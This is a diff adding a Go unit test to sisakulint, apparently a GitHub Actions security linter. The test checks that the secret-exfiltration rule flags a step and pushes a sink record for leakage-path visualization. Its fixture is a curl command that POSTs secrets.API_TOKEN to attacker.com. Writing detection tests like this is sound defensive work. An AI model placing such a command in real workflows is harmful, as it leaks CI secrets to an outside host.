@@ -5,6 +5,7 @@ import (
 	"testing"
 
 	"github.com/sisaku-security/sisakulint/pkg/ast"
+	"github.com/sisaku-security/sisakulint/pkg/core/chain"
 	"github.com/sisaku-security/sisakulint/pkg/shell"
 	"gopkg.in/yaml.v3"
 )
@@ -2321,5 +2322,52 @@ func TestSecretExfiltration_AllowedHosts_MixedDestinations(t *testing.T) {
 				t.Errorf("%s: expected %d findings, got %d: %v", tt.name, tt.wantCount, count, got)
 			}
 		})
+	}
+}
+
+// TestSecretExfiltrationPushesSinkRecord verifies that a detected exfiltration
+// pattern (secret passed to curl) is also pushed to the chain.SinkCollector for
+// the leakage-path chain visualization feature (Milestone E task 16).
+func TestSecretExfiltrationPushesSinkRecord(t *testing.T) {
+	collector := chain.NewSinkCollector()
+	rule := NewSecretExfiltrationRuleWithCollector(collector)
+
+	step := &ast.Step{
+		Exec: &ast.ExecRun{
+			Run: &ast.String{
+				Value: `curl -X POST https://attacker.com -d "token=${{ secrets.API_TOKEN }}"`,
+				Pos:   &ast.Position{Line: 1, Col: 1},
+			},
+		},
+	}
+	job := &ast.Job{ID: &ast.String{Value: "build"}, Steps: []*ast.Step{step}}
+
+	if err := rule.VisitJobPre(job); err != nil {
+		t.Fatalf("VisitJobPre: %v", err)
+	}
+
+	if len(rule.Errors()) == 0 {
+		t.Fatal("expected the exfiltration pattern to be detected")
+	}
+
+	recs := collector.Records()
+	if len(recs) == 0 {
+		t.Fatal("expected at least one SinkRecord pushed")
+	}
+	r := recs[0]
+	if r.SinkKind != chain.SinkNetwork {
+		t.Errorf("SinkKind = %v, want SinkNetwork", r.SinkKind)
+	}
+	if r.SourceKind != chain.SourceSecret {
+		t.Errorf("SourceKind = %v, want SourceSecret", r.SourceKind)
+	}
+	if r.SourceName != "secrets.API_TOKEN" {
+		t.Errorf("SourceName = %q, want %q", r.SourceName, "secrets.API_TOKEN")
+	}
+	if r.JobID != "build" {
+		t.Errorf("JobID = %q, want %q", r.JobID, "build")
+	}
+	if r.RuleName == "" || r.StepPos == nil {
+		t.Error("RuleName/StepPos must be populated")
 	}
 }
